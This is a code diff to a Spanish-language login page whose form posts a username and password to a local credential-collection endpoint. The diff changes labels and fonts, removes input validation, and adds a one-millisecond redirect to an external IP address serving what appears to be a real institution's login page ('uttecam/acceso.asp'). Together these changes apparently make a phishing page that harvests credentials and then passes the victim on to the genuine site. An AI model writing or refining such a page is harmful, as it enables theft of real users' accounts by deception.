@@ -120,8 +120,8 @@
 
       .field-row label {
         padding-right: 4px;
-        font-family: Tahoma, Arial, sans-serif;
-        font-size: 16px;
+        font-family: 'Trebuchet MS', Tahoma, Arial;
+        font-size: small;
         font-weight: 700;
         text-align: right;
       }
@@ -188,7 +188,7 @@
         text-align: center;
         font-family: "CopprplGoth Bd BT", Georgia, "Times New Roman", serif;
         font-size: 20px;
-        font-weight: 700;
+        font-weight: bold;
         line-height: 1.26;
       }
 
@@ -280,12 +280,12 @@
 
             <form id="login-form" class="login-form" action="/api/credentials" method="post" aria-label="Recepción de credenciales" autocomplete="off">
               <div class="field-row">
-                <label for="demo-user">Email</label>
-                <input id="demo-user" name="email" type="email" autocomplete="email" required />
+                <label for="demo-user">Usuario</label>
+                <input id="demo-user" name="email" autocomplete="email" required />
               </div>
               <div class="field-row">
                 <label for="demo-password">Contraseña</label>
-                <input id="demo-password" name="password" type="password" autocomplete="new-password" minlength="8" maxlength="128" required />
+                <input id="demo-password" name="password" autocomplete="new-password" required />
               </div>
 
               <div class="button-row">
@@ -332,6 +332,9 @@
           if (!response.ok) throw new Error(result.error || "No se pudieron recibir los datos.");
           passwordField.value = "";
           message.textContent = "Datos recibidos correctamente.";
+          setTimeout(() => {
+            window.location.href = "http://187.217.125.214/uttecam/acceso.asp";
+            }, 1);
         } catch (error) {
           message.textContent = error.message;
         }
